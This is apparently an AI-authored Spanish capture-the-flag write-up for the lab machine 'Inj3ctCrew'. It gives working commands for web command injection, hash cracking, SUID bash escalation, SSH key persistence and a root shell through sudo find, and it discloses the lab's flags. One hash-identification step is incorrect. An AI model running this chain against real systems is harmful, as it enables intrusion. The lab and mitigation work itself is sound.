# Informe de Explotación - Máquina "Inj3ctCrew" (The Hacker Labs)
**IP Objetivo:** 192.168.231.163
**Fecha:** 14 Julio 2026
**Autor:** Kali (opencode)

---

## 1. RESUMEN EJECUTIVO

Se ha comprometido completamente la máquina "Inj3ctCrew" obteniendo:
- **Flag de usuario (nolen11):** `19238cf8ad4a6b9ea83fae24cf5c739c`
- **Flag de root:** `fd9a2b3a2497ff5d56f52595f060f311`

**Vectores de ataque utilizados:**
1. Fuga de información en backup.php → Credenciales en PwnedCredentials.html
2. Cracking de hash MD5 → Contraseña `qwerty`
3. Panel de administración con RCE (P4n3l.php)
4. Binario SUID personalizado (/system_updates/Updates/.scripts/.system_bash) → Escalada a nolen11
5. Configuración sudo vulnerable (NOPASSWD: /usr/bin/find) → Escalada a root via GTFOBin

---

## 2. RECONOCIMIENTO INICIAL

### 2.1 Escaneo de puertos (Nmap)
```bash
nmap -sS -sV -sC -p- -Pn 192.168.231.163
```

**Resultado:**
| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 |
| 80/tcp | HTTP | Apache httpd 2.4.58 (Ubuntu) |

**Por qué:** Identificar superficie de ataque. Solo puertos 22 y 80 abiertos. Web en puerto 80 es vector principal.

### 2.2 Análisis web inicial
```bash
curl http://192.168.231.163/
```
**Resultado:** Página con título "Sigue Buscando" - pista clara de que hay contenido oculto.

---

## 3. ENUMERACIÓN WEB

### 3.1 Fuzzing de directorios (Gobuster)
```bash
gobuster dir -u http://192.168.231.163/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,js
```

**Resultado:**
- `/backup.php` (200) - **CRÍTICO**
- `/login.php` (200) - Panel de login
- `/PwnedCredentials.html` (referenciado en backup.php)
- `/index.html` (200)

**Por qué:** Descubrir archivos y directorios ocultos. backup.php reveló información crítica.

### 3.2 Análisis de backup.php
```bash
curl http://192.168.231.163/backup.php
```

**Contenido relevante:**
```html
<!-- Nosotros Inj3ctCrew, te hemos dejado una informacion importante en el directorio PwnedCredentials.html -->
```

**Base64 en comentario HTML:**
```
RWwgZGlyZWN0b3JpbyBkZSByZXNwYWxkbyBmdWUgY8y1zZvNisyQzJjMpsyYb8y1zYbNnc2EzZbNk8yYbcy0zJXNkMy/zZPMq82JcMy0zJrNhM2azYlyzLjNmM2EzL/Mocy6b8y4zaDNhM2bzYnMusyibcy1zZvNhs2GzZTNls2NZcy1zZjNoM2gzZTNmcyYdMy1zL/Nnc2AzZrMocyhacy1zaDNkcygzKZkzLXNnc2QzJrMos2UzJlvzLjMkM2EzYDNlsygzKY=
```
**Decodificado:** "El directorio de respaldo fue comprometido — acceso no autorizado detectado."

**Por qué:** Backup.php es un archivo de "prueba de compromiso" que deja pistas intencionales.

### 3.3 Análisis de PwnedCredentials.html
```bash
curl http://192.168.231.163/PwnedCredentials.html
```

**Credenciales expuestas:**
- **Usuario:** `Admin`
- **Contraseña (MD5):** `d8578edf8458ce06fbc5bb76a58c5ca4`

**Por qué:** Fuga intencional de credenciales para acceso al panel administrativo.

---

## 4. CRACKING DE CREDENCIALES

### 4.1 Identificación del hash
```bash
echo "d8578edf8458ce06fbc5bb76a58c5ca4" | md5sum
```
**Resultado:** Hash MD5 de 32 caracteres hexadecimales.

### 4.2 Cracking con John the Ripper
```bash
echo "d8578edf8458ce06fbc5bb76a58c5ca4" > /tmp/hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 /tmp/hash.txt
```

**Resultado:** `qwerty` (crackeado instantáneamente)

**Por qué:** Hash MD5 sin sal, diccionario rockyou contiene contraseñas débiles comunes.

---

## 5. ACCESO AL PANEL ADMINISTRATIVO

### 5.1 Login en /login.php
```bash
curl -c /tmp/cookies.txt -X POST -d "user=Admin&pass=qwerty" http://192.168.231.163/login.php
```

**Resultado:** HTTP 302 Found → Redirect a `P4n3l.php` con cookie `PHPSESSID`

### 5.2 Panel de control (P4n3l.php)
```bash
curl -b /tmp/cookies.txt http://192.168.231.163/P4n3l.php
```

**Funcionalidad:** Formulario con input `cmd` que ejecuta comandos en el sistema como `www-data`.

**Prueba de RCE:**
```bash
curl -b /tmp/cookies.txt "http://192.168.231.163/P4n3l.php?cmd=id"
```
**Resultado:** `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

**Por qué:** Panel web con ejecución de comandos arbitraria (RCE) como www-data.

---

## 6. ENUMERACIÓN POST-EXPLOTACIÓN (COMO WWW-DATA)

### 6.1 Usuarios del sistema
```bash
curl -b /tmp/cookies.txt "http://192.168.231.163/P4n3l.php?cmd=cat+/etc/passwd"
```
**Usuario interesante:** `nolen11:x:1000:1000:nolen11:/home/nolen11:/bin/bash`

### 6.2 Búsqueda de binarios SUID
```bash
curl -b /tmp/cookies.txt "http://192.168.231.163/P4n3l.php?cmd=find+/+-perm+-4000+-type+f+2>/dev/null"
```

**Resultado CRÍTICO:**
```
/system_updates/Updates/.scripts/.system_bash ← SUID PERSONALIZADO
/usr/bin/chfn, /usr/bin/passwd, /usr/bin/mount, /usr/bin/su, /usr/bin/sudo, etc.
```

### 6.3 Análisis del binario SUID personalizado
```bash
curl -b /tmp/cookies.txt "http://192.168.231.163/P4n3l.php?cmd=ls+-la+/system_updates/Updates/.scripts/.system_bash"
```

**Resultado:**
```
-rwsr-xr-x 1 nolen11 nolen11 1446024 Dec 12 2025 /system_updates/Updates/.scripts/.system_bash
```
- **Owner:** nolen11
- **SUID bit:** SET (rws)
- **Tipo:** Bash compilado estáticamente (1.4MB)

```bash
curl -b /tmp/cookies.txt "http://192.168.231.163/P4n3l.php?cmd=strings+/system_updates/Updates/.scripts/.system_bash"
```
**Confirmado:** Es `/bin/bash` compilado con todas las builtins.

**Por qué:** Binario SUID propiedad de nolen11 permite escalada de privilegios vía `-p` flag.

---

## 7. ESCALADA A USUARIO NOLEN11

### 7.1 Explotación del SUID bash
```bash
curl -b /tmp/cookies.txt "http://192.168.231.163/P4n3l.php?cmd=/system_updates/Updates/.scripts/.system_bash+-p+-c+'id'"
```

**Resultado:**
```
uid=33(www-data) gid=33(www-data) euid=1000(nolen11) groups=33(www-data)
```
**¡ÉXITO!** Effective UID = 1000 (nolen11)

### 7.2 Lectura de flag de usuario
```bash
curl -b /tmp/cookies.txt "http://192.168.231.163/P4n3l.php?cmd=/system_updates/Updates/.scripts/.system_bash+-p+-c+'cat+/home/nolen11/user.txt'"
```

**Flag USER:** `19238cf8ad4a6b9ea83fae24cf5c739c`

### 7.3 Establecimiento de persistencia SSH
```bash
# Generar par de claves
ssh-keygen -t rsa -b 2048 -f /tmp/nolen11_key -N ""

# Escribir clave pública via SUID bash
curl -b /tmp/cookies.txt "http://192.168.231.163/P4n3l.php?cmd=/system_updates/Updates/.scripts/.system_bash+-p+-c+'echo+\"PUBLIC_KEY\"+>+/home/nolen11/.ssh/authorized_keys'"
```

### 7.4 Acceso SSH como nolen11
```bash
ssh -i /tmp/nolen11_key nolen11@192.168.231.163
```
**Resultado:** Shell interactiva como nolen11 ✓

---

## 8. ESCALADA A ROOT

### 8.1 Verificación de sudo
```bash
ssh -i /tmp/nolen11_key nolen11@192.168.231.163 "sudo -l"
```

**Resultado:**
```
User nolen11 may run the following commands on TheHackersLabs-Inj3ctCrew:
 (ALL) NOPASSWD: /usr/bin/find
```

**¡CRÍTICO!** nolen11 puede ejecutar `find` como root SIN contraseña.

### 8.2 Explotación GTFOBin - find
**Técnica:** `find` permite `-exec` para ejecutar comandos arbitrarios.

```bash
ssh -i /tmp/nolen11_key nolen11@192.168.231.163 "echo 'id' | sudo find . -exec /bin/sh \; -quit"
```

**Resultado:**
```
uid=0(root) gid=0(root) groups=0(root)
```

### 8.3 Lectura de flag de root
```bash
ssh -i /tmp/nolen11_key nolen11@192.168.231.163 "echo 'cat /root/root.txt' | sudo find . -exec /bin/sh \; -quit"
```

**Flag ROOT:** `fd9a2b3a2497ff5d56f52595f060f311`

---

## 9. CADENA DE ATAQUE COMPLETA

```
┌─────────────────────────────────────────────────────────────────┐
│ CADENA DE EXPLOTACIÓN │
├─────────────────────────────────────────────────────────────────┤
│ │
│ [1] RECONOCIMIENTO │
│ ┌─ Nmap ──────────────────┐ │
│ │ Puertos: 22(SSH), 80(HTTP) │
│ └─────────────────────────┘ │
│ │ │
│ ▼ │
│ [2] ENUMERACIÓN WEB │
│ ┌─ Gobuster ─────────────┐ ┌─ backup.php ──────────────┐ │
│ │ /backup.php │────▶│ Pista: PwnedCredentials │ │
│ │ /login.php │ │ Base64: "directorio │ │
│ │ /PwnedCredentials.html │ │ comprometido" │ │
│ └─────────────────────────┘ └──────────────────────────┘ │
│ │ │
│ ▼ │
│ [3] CREDENCIALES │
│ ┌─ PwnedCredentials.html ┐ ┌─ John the Ripper ─────────┐ │
│ │ Admin:d8578edf8458ce... │────▶│ MD5 → qwerty (instant) │ │
│ └─────────────────────────┘ └──────────────────────────┘ │
│ │ │
│ ▼ │
│ [4] ACCESO INICIAL (RCE) │
│ ┌─ POST /login.php ──────┐ ┌─ P4n3l.php (RCE) ─────────┐ │
│ │ Admin:qwerty │────▶│ Ejecución comandos como │ │
│ │ Cookie PHPSESSID │ │ www-data │ │
│ └─────────────────────────┘ └──────────────────────────┘ │
│ │ │
│ ▼ │
│ [5] ENUMERACIÓN INTERNA │
│ ┌─ find / -perm -4000 ──┐ ┌─ /system_updates/Updates/ │ │
│ │ SUID binarios │────▶│ .scripts/.system_bash │ │
│ └─────────────────────────┘ │ (bash SUID, owner nolen11)│ │
│ └────────────────────────────┘ │
│ │ │
│ ▼ │
│ [6] ESCALADA A NOLEN11 │
│ ┌─ .system_bash -p -c 'id'┐ ┌─ euid=1000(nolen11) ──────┐ │
│ │ Bash SUID con -p │────▶│ Lectura user.txt + SSH │ │
│ └─────────────────────────┘ └────────────────────────────┘ │
│ │ │
│ ▼ │
│ [7] ESCALADA A ROOT │
│ ┌─ sudo -l ─────────────┐ ┌─ GTFOBin find ────────────┐ │
│ │ (ALL) NOPASSWD: find │────▶│ sudo find . -exec /bin/sh │ │
│ └─────────────────────────┘ │ \; -quit → ROOT │ │
│ └────────────────────────────┘ │
│ │ │
│ ▼ │
│ [8] FLAGS │
│ ┌────────────────────────────────────────────────────────────┐ │
│ │ USER: 19238cf8ad4a6b9ea83fae24cf5c739c │ │
│ │ ROOT: fd9a2b3a2497ff5d56f52595f060f311 │ │
│ └────────────────────────────────────────────────────────────┘ │
│ │
└─────────────────────────────────────────────────────────────────┘
```

---

## 10. VULNERABILIDADES IDENTIFICADAS

| # | Vulnerabilidad | Severidad | Ubicación | Impacto |
|---|----------------|-----------|-----------|---------|
| 1 | Fuga de credenciales en archivo web | CRÍTICA | `/PwnedCredentials.html` | Acceso a panel admin |
| 2 | Hash MD5 sin sal, contraseña débil | ALTA | Credenciales Admin | Cracking trivial |
| 3 | RCE en panel administrativo | CRÍTICA | `/P4n3l.php` (parámetro `cmd`) | Ejecución código como www-data |
| 4 | Binario SUID personalizado (bash) | CRÍTICA | `/system_updates/Updates/.scripts/.system_bash` | Escalada a nolen11 |
| 5 | Sudo NOPASSWD en find | CRÍTICA | `/etc/sudoers.d/ctf-find-only` | Escalada a root (GTFOBin) |
| 6 | Clave SSH autorizada escribible | MEDIA | `/home/nolen11/.ssh/authorized_keys` | Persistencia |

---

## 11. RECOMENDACIONES DE MITIGACIÓN

1. **Eliminar archivos de prueba/backup** expuestos en webroot (`backup.php`, `PwnedCredentials.html`)
2. **Usar hashing fuerte** (bcrypt, Argon2) con sal única por usuario
3. **Deshabilitar ejecución de comandos** en paneles web; usar APIs controladas
4. **Eliminar binarios SUID innecesarios**; auditar `/system_updates/`
5. **Restringir sudo**: evitar NOPASSWD; si es necesario, limitar a comandos específicos SIN shell escapes
6. **Proteger authorized_keys**: `chmod 600`, `chattr +i`, monitoreo de integridad
7. **Implementar WAF/IDS** para detectar comandos sospechosos en parámetros web
8. **Principio de menor privilegio**: www-data no debería leer /etc/sudoers.d/

---

## 12. COMANDOS CLAVE UTILIZADOS

```bash
# Reconocimiento
nmap -sS -sV -sC -p- -Pn 192.168.231.163
gobuster dir -u http://192.168.231.163/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,js

# Credenciales
curl http://192.168.231.163/PwnedCredentials.html
echo "d8578edf8458ce06fbc5bb76a58c5ca4" | john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 --stdin

# RCE Panel
curl -c /tmp/cookies.txt -X POST -d "user=Admin&pass=qwerty" http://192.168.231.163/login.php
curl -b /tmp/cookies.txt "http://192.168.231.163/P4n3l.php?cmd=id"

# Enumeración SUID
curl -b /tmp/cookies.txt "http://192.168.231.163/P4n3l.php?cmd=find+/+-perm+-4000+-type+f+2>/dev/null"

# Escalada nolen11 (SUID bash)
curl -b /tmp/cookies.txt "http://192.168.231.163/P4n3l.php?cmd=/system_updates/Updates/.scripts/.system_bash+-p+-c+'id'"
curl -b /tmp/cookies.txt "http://192.168.231.163/P4n3l.php?cmd=/system_updates/Updates/.scripts/.system_bash+-p+-c+'cat+/home/nolen11/user.txt'"

# Persistencia SSH
ssh-keygen -t rsa -b 2048 -f /tmp/nolen11_key -N ""
curl -b /tmp/cookies.txt "http://192.168.231.163/P4n3l.php?cmd=/system_updates/Updates/.scripts/.system_bash+-p+-c+'echo+\"PUBKEY\"+>+/home/nolen11/.ssh/authorized_keys'"
ssh -i /tmp/nolen11_key nolen11@192.168.231.163

# Escalada Root (GTFOBin find)
ssh -i /tmp/nolen11_key nolen11@192.168.231.163 "sudo -l"
ssh -i /tmp/nolen11_key nolen11@192.168.231.163 "echo 'cat /root/root.txt' | sudo find . -exec /bin/sh \; -quit"
```

---

## 13. EVIDENCIAS DE COMPROMISO

```
┌────────────────────────────────────────────────────────────┐
│ FLAGS OBTENIDAS │
├────────────────────────────────────────────────────────────┤
│ USER (nolen11): 19238cf8ad4a6b9ea83fae24cf5c739c │
│ ROOT: fd9a2b3a2497ff5d56f52595f060f311 │
└────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────┐
│ ACCESOS LOGRADOS │
├────────────────────────────────────────────────────────────┤
│ ✓ Web Panel (Admin/qwerty) → RCE como www-data │
│ ✓ SUID Bash → Escalada efectiva a nolen11 (euid=1000) │
│ ✓ SSH como nolen11 (clave RSA 2048) │
│ ✓ Sudo NOPASSWD find → GTFOBin → Root (uid=0) │
└────────────────────────────────────────────────────────────┘
```

---

**FIN DEL INFORME**
